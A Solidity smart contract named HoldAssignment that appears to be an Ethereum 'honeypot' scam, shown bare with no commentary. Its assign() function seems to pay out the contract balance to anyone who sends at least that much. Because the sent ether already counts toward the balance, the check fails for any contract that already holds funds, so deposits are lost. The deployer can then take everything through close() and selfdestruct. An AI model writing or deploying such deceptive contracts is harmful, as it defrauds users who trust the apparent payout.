1 pragma solidity ^0.4.25;
2 
3 contract HoldAssignment
4 {
5     constructor() public payable {
6         org = msg.sender;
7     }
8     function() external payable {}
9     address org;
10     function close() public {
11         if (msg.sender==org)
12             selfdestruct(msg.sender);
13     }
14     function assign() public payable {
15         if (msg.value >= address(this).balance)
16             msg.sender.transfer(address(this).balance);
17     }
18 }